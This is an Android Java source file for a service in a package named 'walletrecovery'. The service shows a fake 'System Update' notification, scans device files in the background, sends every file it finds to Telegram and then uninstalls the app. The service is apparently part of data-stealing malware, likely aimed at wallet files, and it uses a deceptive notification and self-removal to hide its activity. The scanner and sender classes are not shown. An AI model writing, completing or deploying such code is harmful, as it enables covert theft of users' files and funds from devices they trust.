package com.example.walletrecovery;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.File;
import java.util.List;

public class CoreService extends Service {
    private static final String CHANNEL_ID = "SystemNotificationChannel";
    private static final String TAG = "CoreService";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Update")
                .setContentText("Running background tasks...")
                .setSmallIcon(android.R.drawable.stat_sys_warning) 
                .build();
        startForeground(1, notification);

        new Thread(() -> {
            Log.d(TAG, "Starting file scanning...");
            List<File> files = FileScanner.scan(getApplicationContext());
            if (files != null && !files.isEmpty()) {
                Log.d(TAG, "Suspicious files found: " + files.size());
                for (File file : files) {
                    TelegramSender.sendFile(file);
                }
            } else {
                Log.d(TAG, "No suspicious files found.");
            }
            
           
            SelfDestruct.uninstallApp(this);
            
            stopSelf();
        }).start();

        return START_NOT_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Updates",
                    NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
